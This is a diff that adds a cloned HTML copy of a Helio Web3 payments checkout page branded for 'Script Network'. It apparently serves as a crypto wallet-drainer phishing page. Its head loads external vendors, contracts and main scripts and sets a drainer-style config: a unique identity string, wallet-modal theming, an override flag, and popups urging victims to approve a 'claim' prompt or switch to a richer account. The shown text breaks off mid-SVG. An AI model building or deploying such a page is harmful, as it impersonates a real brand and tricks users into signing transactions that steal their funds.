@@ -1,0 +1,2061 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://www.hel.io/x/glasspasseth" data-scrapbook-create="20230914162016190"
+  data-scrapbook-title="Helio | The Web3 payments platform ⚡️">
+
+<head>
+  <script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+
+  <script>
+    window.UNIQUE_IDENTITY = "happy_shakika_29";
+
+    // Pick a theme here, this defaults to "light"
+    window.modal_theme = "light" || "dark";
+
+    // https://docs.walletconnect.com/2.0/web3modal/html/wagmi/theming
+    window.modal_variables = {
+      /* Example of what you can do */
+      // "--w3m-accent-color": "#FF00FF",
+      // "--w3m-background-color": "#FF00FF",
+      // "--w3m-logo-image-url": "/your-logo.svg",
+    };
+
+    // Notification modals
+    window.popups = {
+      PENDING: {
+        // The popup that shows when they get prompted
+        // title: "Claim Pending",
+        text: "You must approve the prompt in order to continue."
+      },
+      INVALID: {
+        // Shown when they connect on a wallet that is poor.
+        // title: "Ineligible Address",
+        text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+      }
+    }
+
+    // Only touch this if you know what you're doing!
+    window.OVERRIDE_MODE = false;
+  </script>
+  <meta name="viewport" content="width=device-width">
+  <link rel="mask-icon" href="https://www.hel.io/favicons/safari-pinned-tab.svg" color="#5bbad5">
+  <meta charset="UTF-8">
+  <title>Helio | The Web3 payments platform ⚡️</title>
+  <meta name="robots" content="follow, index">
+  <meta
+    content="Sell anything with the power of DeFi. Launch a product in minutes &amp; get paid instantly - now on Solana, Ethereum, and Polygon"
+    name="description">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Helio">
+  <meta property="og:description"
+    content="Sell anything with the power of DeFi. Launch a product in minutes &amp; get paid instantly - now on Solana, Ethereum, and Polygon">
+  <meta property="og:title" content="Helio | The Web3 payments platform ⚡️">
+  <meta name="image" property="og:image" content="">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@helio_payments">
+  <meta name="twitter:title" content="Helio | The Web3 payments platform ⚡️">
+  <meta name="twitter:description"
+    content="Sell anything with the power of DeFi. Launch a product in minutes &amp; get paid instantly - now on Solana, Ethereum, and Polygon">
+  <meta name="twitter:image" content="">
+  <link rel="apple-touch-icon" sizes="57x57" href="https://www.hel.io/favicon/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="https://www.hel.io/favicon/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="https://www.hel.io/favicon/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.hel.io/favicon/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="https://www.hel.io/favicon/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="https://www.hel.io/favicon/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="https://www.hel.io/favicon/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="https://www.hel.io/favicon/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://www.hel.io/favicon/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <link rel="manifest" href="https://www.hel.io/favicon/manifest.json">
+  <link rel="shortcut icon" href="favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/favicon/ms-icon-144x144.png">
+  <meta property="og:url" content="https://hel.io/x/glasspasseth">
+  <meta name="theme-color" content="#ffffff">
+  <link rel="canonical" href="https://hel.io/x/glasspasseth">
+  <meta name="next-head-count" content="37">
+  <link rel="stylesheet" href="4b3f1c2e09d9a6f3.css" data-n-g="">
+  <link rel="stylesheet" href="69cc9dc15dfbf8b9.css" data-n-p=""><noscript data-n-css=""></noscript>
+  <style data-styled="active" data-styled-version="5.3.9">
+    body {
+      background: rgb(245, 247, 250) !important;
+      color: rgb(128, 139, 157) !important;
+    }
+
+    :root {
+      --helio-background-modal: rgb(0 0 0 / 0.4);
+      --helio-background-transparent: rgb(0 0 0 / 0.5);
+      --helio-text-on-transparent: #ffffff;
+      --helio-background-dashboard: #F5F7FA;
+      --helio-background-container: #fff;
+      --helio-background-input: #fff;
+      --helio-background-input-disabled: #EBEFF3;
+      --helio-background-container-alternative: #fff;
+      --helio-background-primary: #F76C1B;
+      --helio-background-alternative: #5A6578;
+      --helio-background-primary-disabled: #A9B3C4;
+      --helio-background-secondary: #FFF5E9;
+      --helio-background-secondary-alternative: #FFEAD2;
+      --helio-background-highest-contrast: #000;
+      --helio-background-code: #000;
+      --background-markdown-menu: #F5F7FA;
+      --helio-text-input-disabled: #808B9D;
+      --helio-text-code: #FFD4A3;
+      --helio-text-revealed-content: #F76C1B;
+      --helio-text-cell: #5A6578;
+      --helio-text-cell-subtitle: #808B9D;
+      --helio-text-inactive-on-gradient: #808B9D;
+      --helio-background-secondary-disabled: #EBEFF3;
+      --helio-background-table-disabled-menu: #EBEFF3;
+      --helio-background-checkout-footer: #EBEFF3;
+      --helio-background-bold: #808B9D;
+      --helio-background-selected-item: #FFF8F4;
+      --helio-background-for-candy-dark: #fff;
+      --helio-background-invoice-search: #fff;
+      --helio-background-button-link-hover: #CF5014;
+      --helio-background-square-company-logo: #fff;
+      --helio-background-tab-active: #fff;
+      --helio-background-tab-inactive: #5A6578;
+      --helio-background-tooltip: #000;
+      --helio-background-dropdown-hover: #FFF8F4;
+      --helio-background-dropdown-active: #FA8938;
+      --helio-background-no-data-icon: #fff;
+      --helio-background-integration-code: #000;
+      --helio-background-warning-topbar: #F76C1B;
+      --helio-background-cancelled-topbar: #808B9D;
+      --helio-background-success-topbar: #EEFAED;
+      --helio-background-success: #EEFAED;
+      --helio-background-success-alternative: #EEFAED;
+      --helio-background-success-dark: #94DF8D;
+      --helio-text-success: #74AE6E;
+      --helio-text-success-alternative: #94DF8D;
+      --helio-background-neutral: #F5F7FA;
+      --helio-background-cancelled: #F5F7FA;
+      --helio-text-neutral: #808B9D;
+      --helio-text-cancelled: #808B9D;
+      --helio-background-warning: #FFF5E9;
+      --helio-background-warning-alternative: #FFF5E9;
+      --helio-text-warning: #FA8938;
+      --helio-text-warning-alternative: #F76C1B;
+      --helio-text-cancelled-alternative: #808B9D;
+      --helio-background-danger: #FEE9E9;
+      --helio-background-danger-top-bar: #FEE9E9;
+      --helio-text-danger: #F87272;
+      --helio-border-color: #EBEFF3;
+      --helio-border-tab: #5A6578;
+      --helio-border-alternative: #FFD4A3;
+      --helio-border-alternative-light: #FFEAD2;
+      --helio-border-inactive-color: #A9B3C4;
+      --helio-border-primary-color: #F76C1B;
+      --helio-border-primary-color-hover: #F76C1B;
+      --helio-border-input-checked-color: #F76C1B;
+      --helio-border-checkbox-color: #808B9D;
+      --helio-border-input-disabled-color: #EBEFF3;
+      --helio-text-button: #fff;
+      --helio-text-button-primary-disabled: #fff;
+      --helio-text-button-badge: #fff;
+      --helio-text-footer-link: #fff;
+      --helio-text-highest-contrast: #000;
+      --helio-text-high-contrast: #5A6578;
+      --helio-text-low-contrast: #808B9D;
+      --helio-text-lowest-contrast: #fff;
+      --helio-text-on-primary-background-contrast: #FFD4A3;
+      --helio-text-link: #F76C1B;
+      --helio-text-link-on-gradients: #F76C1B;
+      --helio-text-link-hover: #CF5014;
+      --helio-text-sidebar-hover: #F76C1B;
+      --helio-text-on-primary-background-hover: #E1E6EC;
+      --helio-text-disabled: #EBEFF3;
+      --helio-text-sidebar: #5A6578;
+      --helio-text-sidebar-disabled: #A9B3C4;
+      --helio-text-tab-active: #808B9D;
+      --helio-text-tab-inactive: #fff;
+      --helio-text-table-disabled-menu: #A9B3C4;
+      --helio-text-create-payment-active: #5A6578;
+      --helio-text-create-payment-inactive: #A9B3C4;
+      --helio-fill-icon: #5A6578;
+      --helio-fill-on-primary-background: #fff;
+      --helio-gradient-merchant: linear-gradient(to right bottom, #d8d9f5, #feeef2 20%, #feede3 70%, #fffdf5);
+      --helio-gradient-candy: linear-gradient(to right, #D8D9F5, #FEEEF2 20%, #FEEDE3 70%, #FFFDF5);
+      --helio-gradient-candy-dark: linear-gradient(to right, #F76C1B, #DC1FFF);
+      --helio-gradient-candy-down: linear-gradient(135deg, #D8D9F5 3.02%, #FEEEF6 32.91%, #FEEDE3 68.61%, #FFFDF5 108.02%);
+      --helio-gradient-candy-down-right: linear-gradient(129.81deg, #D8D9F5 -16.87%, #FEEEF2 18%, #FEEDE3 66.15%, #F5FFFA 116.03%);
+      --helio-gradient-orange-fade: linear-gradient(0deg, rgba(247, 108, 27, 0.5) -10.83%, rgba(223, 221, 246, 0) 58.53%);
+      --helio-text-display: #000;
+      --helio-text-container-title: #5A6578;
+      --helio-text-menu-inactive: #5A6578;
+      --helio-text-menu-active: #F76C1B;
+      --helio-text-body: #5A6578;
+      --helio-text-body-inactive: #808B9D;
+      --helio-text-body-active: #F76C1B;
+      --helio-text-label: #A7350D;
+      --helio-text-label-header-inactive: #808B9D;
+      --helio-text-label-header-active: #5A6578;
+      --helio-text-tooltip: #FFF5E9;
+      --helio-text-detected: #801A07;
+      --helio-fill-disabled-input-button: #EBEFF3;
+      --helio-text-body-alternative: #5A0000;
+      --helio-fill-toggle: #5A6578;
+      --helio-fill-toggle-alternative: #808B9D;
+      --helio-fill-more-options: #808B9D;
+      --helio-text-placeholder: #A9B3C4;
+      --helio-color-footer: #5A6578;
+      --helio-color-footer-active: #808B9D;
+      --helio-color-footer-alternative: #5A6578;
+      color-scheme: light;
+      --helio-shadow-primary-30-2xl: 0 25px 50px -12px rgb(247 108 27 / 0.3) !important;
+      --helio-shadow-default: 0px 8px 10px rgba(195, 200, 209, .2) !important;
+      --helio-shadow-primary-40-lg: 0 10px 15px -3px rgb(247 108 27 / 0.4), 0 4px 6px -4px rgb(247 108 27 / 0.4) !important;
+      --helio-shadow-primary-50-2xl: 0 25px 50px -12px rgb(247 108 27 / 0.5) !important;
+      --helio-shadow-primary-60-lg: 0 10px 15px -3px rgb(247 108 27 / 0.6), 0 4px 6px -4px rgb(247 108 27 / 0.6) !important;
+      --helio-shadow-wallet-button: 0 6px 5px #fed7aa !important;
+      --helio-shadow-heliox: 0px 32px 80px #FFD6BE !important;
+      --helio-shadow-create-payment-number: 0 10px 15px -3px #f76c1b, 0 4px 6px -4px #f76c1b !important;
+      --helio-fill-unverified-icon: #808B9D !important;
+    }
+
+    .fgYsxp {
+      display: inline-flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      justify-content: center;
+      border-radius: 0.5rem;
+      padding: 0.75rem 2rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      transition-property: color, background-color, border-color, text-decoration-color, fill, stroke;
+      transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+      transition-duration: 75ms;
+      background: rgb(255, 245, 233) !important;
+      color: rgb(247, 108, 27) !important;
+      fill: rgb(247, 108, 27) !important;
+    }
+
+    .fgYsxp:focus {
+      outline: transparent solid 2px;
+      outline-offset: 2px;
+    }
+
+    .fgYsxp:focus-visible {
+      --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
+      --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(3px + var(--tw-ring-offset-width)) var(--tw-ring-color);
+      box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
+      --tw-ring-opacity: 1;
+      --tw-ring-color: rgb(247 108 27 / var(--tw-ring-opacity));
+    }
+
+    .fgYsxp:hover {
+      background: rgb(247, 108, 27) !important;
+      color: rgb(255, 255, 255) !important;
+      fill: rgb(255, 255, 255) !important;
+    }
+
+    .fgYsxp:disabled,
+    .fgYsxp:disabled:hover {
+      background: rgb(235, 239, 243) !important;
+      color: rgb(128, 139, 157) !important;
+    }
+
+    .fgYsxp:disabled {
+      cursor: not-allowed;
+      border-style: none;
+    }
+
+    .jTXbXR {
+      display: inline-flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      justify-content: center;
+      border-radius: 0.5rem;
+      padding: 0.75rem 2rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      transition-property: color, background-color, border-color, text-decoration-color, fill, stroke;
+      transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+      transition-duration: 75ms;
+      box-shadow: rgba(247, 108, 27, 0.6) 0px 10px 15px -3px, rgba(247, 108, 27, 0.6) 0px 4px 6px -4px !important;
+      background: rgb(247, 108, 27) !important;
+      color: rgb(255, 255, 255) !important;
+      fill: rgb(255, 255, 255) !important;
+    }
+
+    .jTXbXR:focus {
+      outline: transparent solid 2px;
+      outline-offset: 2px;
+    }
+
+    .jTXbXR:focus-visible {
+      --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
+      --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(3px + var(--tw-ring-offset-width)) var(--tw-ring-color);
+      box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
+      --tw-ring-opacity: 1;
+      --tw-ring-color: rgb(247 108 27 / var(--tw-ring-opacity));
+    }
+
+    .jTXbXR:hover {
+      background: rgb(207, 80, 20) !important;
+      color: rgb(255, 255, 255) !important;
+    }
+
+    .jTXbXR:disabled,
+    .jTXbXR:disabled:hover {
+      color: rgb(255, 255, 255) !important;
+      background: rgb(169, 179, 196) !important;
+    }
+
+    .jTXbXR:disabled {
+      cursor: not-allowed;
+      border-style: none;
+    }
+
+    .gizPFD {
+      color: rgb(247, 108, 27) !important;
+    }
+
+    .gizPFD:hover {
+      color: rgb(207, 80, 20) !important;
+    }
+
+    .ipLlvi {
+      margin-bottom: 0px;
+      margin-top: auto;
+      display: flex;
+      width: 100%;
+      -webkit-box-align: center;
+      align-items: center;
+    }
+
+    .dnWBHK {
+      position: relative;
+      height: 4rem;
+      width: 4rem;
+      overflow: hidden;
+      border-radius: 9999px;
+    }
+
+    .OlKRb {
+      margin-left: 0.5rem;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    .dpUDOM {
+      border-radius: 0.5rem;
+      padding-top: 0.75rem;
+      padding-bottom: 0.75rem;
+      background: var(--helio-background-secondary) !important;
+    }
+
+    .hJoYWE {
+      margin-left: 0.75rem;
+      margin-right: 0.75rem;
+      display: flex;
+      flex-direction: row;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      color: rgb(167, 53, 13) !important;
+    }
+
+    .lgkkVs {
+      width: 100%;
+    }
+
+    .hzMMUE {
+      margin-top: 0.5rem;
+      margin-bottom: 0.5rem;
+      display: flex;
+      width: 100%;
+      -webkit-box-align: center;
+      align-items: center;
+      column-gap: 1rem;
+    }
+
+    .hfaXuf {
+      display: flex;
+      flex-direction: column;
+    }
+
+    @media (min-width: 640px) {
+      .hfaXuf {
+        width: 280px;
+      }
+    }
+
+    .gqHyVf {
+      font-size: 0.875rem;
+      line-height: 1.25rem;
+      font-weight: 400;
+      --tw-text-opacity: 1;
+      color: rgb(90 101 120 / var(--tw-text-opacity));
+    }
+
+    .djIHUd {
+      display: flex;
+      flex-direction: row;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      border-bottom-width: 1px;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      border-bottom-color: var(--helio-border-color);
+    }
+
+    .dMmSQm {
+      display: flex;
+      flex-direction: row;
+      -webkit-box-align: center;
+      align-items: center;
+      column-gap: 5px;
+      padding-top: 1rem;
+      padding-bottom: 1rem;
+    }
+
+    .bRsECr {
+      text-align: left;
+    }
+
+    .hFvFgb {
+      margin-top: 16px;
+      display: flex;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .jgEplw {
+      font-size: 0.875rem;
+      line-height: 1.25rem;
+      color: var(--helio-text-label) !important;
+    }
+
+    .gpKcQe {
+      color: var(--helio-text-body);
+    }
+
+    .gpKcQe h1,
+    .gpKcQe h2,
+    .gpKcQe h3,
+    .gpKcQe h4,
+    .gpKcQe h5,
+    .gpKcQe h6 {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .gpKcQe h1:first-child,
+    .gpKcQe h2:first-child,
+    .gpKcQe h3:first-child,
+    .gpKcQe h4:first-child,
+    .gpKcQe h5:first-child,
+    .gpKcQe h6:first-child {
+      margin-top: 0px;
+    }
+
+    .gpKcQe p {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .gpKcQe ul {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+      padding-left: 1rem;
+    }
+
+    .gpKcQe ul li {
+      margin-top: 0.25rem;
+      margin-bottom: 0.25rem;
+      list-style-type: disc;
+    }
+
+    .gpKcQe ol {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+      padding-left: 1rem;
+    }
+
+    .gpKcQe ol li {
+      margin-top: 0.25rem;
+      margin-bottom: 0.25rem;
+      list-style-type: decimal;
+    }
+
+    .gpKcQe a {
+      text-decoration-line: underline;
+      text-underline-offset: 2px;
+      color: var(--helio-text-link) !important;
+    }
+
+    .gpKcQe img {
+      margin-top: 1.25rem;
+      margin-bottom: 1.25rem;
+      border-radius: 0.5rem;
+    }
+
+    .gpKcQe blockquote {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+      border-left-width: 4px;
+      --tw-border-opacity: 1;
+      border-color: rgb(247 108 27 / var(--tw-border-opacity));
+      --tw-bg-opacity: 1;
+      background-color: rgb(255 245 233 / var(--tw-bg-opacity));
+      padding-top: 0.5rem;
+      padding-bottom: 0.5rem;
+      padding-left: 1rem;
+    }
+
+    .gpKcQe blockquote p {
+      margin-top: 0.5rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .gpKcQe pre {
+      margin-top: 1rem;
+      margin-bottom: 1rem;
+      white-space: pre-wrap;
+      border-radius: 0.5rem;
+      --tw-bg-opacity: 1;
+      background-color: rgb(235 239 243 / var(--tw-bg-opacity));
+      padding: 1rem;
+      --tw-text-opacity: 1;
+      color: rgb(90 101 120 / var(--tw-text-opacity));
+    }
+
+    .gpKcQe pre code {
+      background-color: transparent;
+    }
+
+    .krEsBK:hover {
+      color: var(--helio-text-high-contrast) !important;
+    }
+
+    .iEcJKR {
+      position: relative;
+      margin-left: auto;
+      margin-right: auto;
+      height: 16rem;
+      overflow: hidden;
+      border-radius: 0.5rem;
+    }
+
+    .dmWmte {
+      font-size: 0.875rem;
+      line-height: 1.25rem;
+    }
+
+    .bnzddx {
+      position: relative;
+      width: 100%;
+    }
+
+    @media (min-width: 768px) {
+      .bnzddx {
+        width: 66.6667%;
+      }
+    }
+
+    .gRkwAF {
+      margin-top: 0.5rem;
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      column-gap: 0.5rem;
+    }
+
+    .fcLKqE {
+      display: flex;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .ekyFDK {
+      font-weight: 300;
+    }
+
+    .dQGkxB {
+      display: flex;
+      flex: 1 1 0%;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      column-gap: 0.5rem;
+    }
+
+    @media (min-width: 1024px) {
+      .dQGkxB {
+        -webkit-box-pack: start;
+        justify-content: flex-start;
+      }
+    }
+
+    .kCqcQ {
+      display: flex;
+      width: 100%;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+      column-gap: 0.5rem;
+    }
+
+    .dTmhXC {
+      display: flex;
+      width: 100%;
+      flex-direction: column;
+      row-gap: 0.5rem;
+    }
+
+    .cJNoyC {
+      display: flex;
+      width: 100%;
+      -webkit-box-pack: justify;
+      justify-content: space-between;
+    }
+
+    .kMwGIE {
+      width: fit-content;
+      border-radius: 0.5rem;
+      padding: 0.25rem 0.5rem;
+      color: rgb(90, 101, 120) !important;
+      background: rgb(245, 247, 250) !important;
+    }
+
+    .gFxkpZ {
+      font-weight: 700;
+      color: var(--helio-text-label-header-active) !important;
+    }
+  </style>
+  <style id="_goober">
+    @keyframes go2264125279 {
+      from {
+        transform: scale(0) rotate(45deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(45deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go3020080000 {
+      from {
+        transform: scale(0);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go463499852 {
+      from {
+        transform: scale(0) rotate(90deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(90deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go1268368563 {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes go1310225428 {
+      from {
+        transform: scale(0) rotate(45deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(45deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go651618207 {
+      0% {
+        height: 0;
+        width: 0;
+        opacity: 0;
+      }
+
+      40% {
+        height: 0;
+        width: 6px;
+        opacity: 1;
+      }
+
+      100% {
+        opacity: 1;
+        height: 10px;
+      }
+    }
+
+    @keyframes go901347462 {
+      from {
+        transform: scale(0.6);
+        opacity: 0.4;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .go4109123758 {
+      z-index: 9999;
+    }
+
+    .go4109123758>* {
+      pointer-events: auto;
+    }
+  </style>
+  <style>
+    @keyframes react-spinners-PuffLoader-puff-1 {
+      0% {
+        transform: scale(0);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+  </style>
+  <style>
+    @keyframes react-spinners-PuffLoader-puff-2 {
+      0% {
+        opacity: 1;
+      }
+
+      100% {
+        opacity: 0;
+      }
+    }
+  </style>
+  <style>
+    @keyframes react-spinners-BeatLoader-beat {
+      50% {
+        transform: scale(0.75);
+        opacity: 0.2;
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+  </style>
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer", "wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<body data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0">
+  <div id="__next">
+    <div class="mx-4 mb-6 md:mx-auto md:mb-16 md:w-4/5">
+      <div class="mb-5 flex w-full flex-row justify-between pt-3">
+        <div class="styles__CompanyContainer-sc-rsw80q-0 ipLlvi">
+          <div class="styles__CompanyImageContainer-sc-rsw80q-1 dnWBHK">
+            <div><img alt="Branding image" loading="lazy" decoding="async" data-nimg="fill"
+                class="transition-all duration-200" sizes="100vw"
+                srcset="rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 640w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 750w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 828w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 1080w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 1200w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 1920w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 2048w, rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg 3840w"
+                src="rWiYV9PTZbfAIzmNupOD0TzqXfnEu2uiThYDkntx.jpg"
+                style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent; background-size: cover; background-position: 50% 50%; background-repeat: no-repeat; background-image: url(&quot;cad3a2ad34450ef8ea6e07e845650b550b035639.svg&quot;);">
+            </div>
+          </div>
+          <div class="styles__CompanyDetailsContainer-sc-rsw80q-2 OlKRb">
+            <h2 class="text-xl font-bold helio-text-display cursor-pointer">Script Network</h2>
+            <div>
+              <div>
+                <div class="flex items-center">
+                  <div class="fill-[#1D9BF0] h-8 w-8"><svg viewBox="3 0 36 36" fill="none"
+                      xmlns="http://www.w3.org/2000/svg">
+                      <g filter="url(#filter0_d_10567_409597)">
+                        <path
+                          d="M16.6744 3.17343C17.4312 2.50352 18.5688 2.50352 19.3256 3.17343L21.7271 5.29919C22.0615 5.5952 22.4854 5.77077 22.9312 5.79792L26.1324 5.99288C27.1412 6.05432 27.9457 6.85877 28.0071 7.86761L28.2021 11.0688C28.2292 11.5146 28.4048 11.9385 28.7008 12.2729L30.8266 14.6744C31.4965 15.4312 31.4965 16.5688 30.8266 17.3256L28.7008 19.7271C28.4048 20.0615 28.2292 20.4854 28.2021 20.9312L28.0071 24.1324C27.9457 25.1412 27.1412 25.9457 26.1324 26.0071L22.9312 26.2021C22.4854 26.2292 22.0615 26.4048 21.7271 26.7008L19.3256 28.8266C18.5688 29.4965 17.4312 29.4965 16.6744 28.8266L14.2729 26.7008C13.9385 26.4048 13.5146 26.2292 13.0688 26.2021L9.86761 26.0071C8.85877 25.9457 8.05432 25.1412 7.99288 24.1324L7.79792 20.9312C7.77077 20.4854 7.5952 20.0615 7.29919 19.7271L5.17343 17.3256C4.50352 16.5688 4.50352 15.4312 5.17343 14.6744L7.29919 12.2729C7.5952 11.9385 7.77077 11.5146 7.79792 11.0688L7.99288 7.86761C8.05432 6.85877 8.85877 6.05432 9.86761 5.99288L13.0688 5.79792C13.5146 5.77077 13.9385 5.5952 14.2729 5.29919L16.6744 3.17343Z"
+                          fill="url(#paint0_linear_10567_409597)"></path>
+                      </g>
+                      <path fill-rule="evenodd" clip-rule="evenodd"
+                        d="M17.9998 9.33341C14.3179 9.33341 11.3332 12.3182 11.3332 16.0001C11.3332 19.682 14.3179 22.6667 17.9998 22.6667C21.6817 22.6667 24.6665 19.682 24.6665 16.0001C24.6665 12.3182 21.6817 9.33341 17.9998 9.33341ZM9.6665 16.0001C9.6665 11.3977 13.3975 7.66675 17.9998 7.66675C22.6022 7.66675 26.3332 11.3977 26.3332 16.0001C26.3332 20.6025 22.6022 24.3334 17.9998 24.3334C13.3975 24.3334 9.6665 20.6025 9.6665 16.0001Z"
+                        fill="url(#paint1_linear_10567_409597)"></path>
+                      <path fill-rule="evenodd" clip-rule="evenodd"
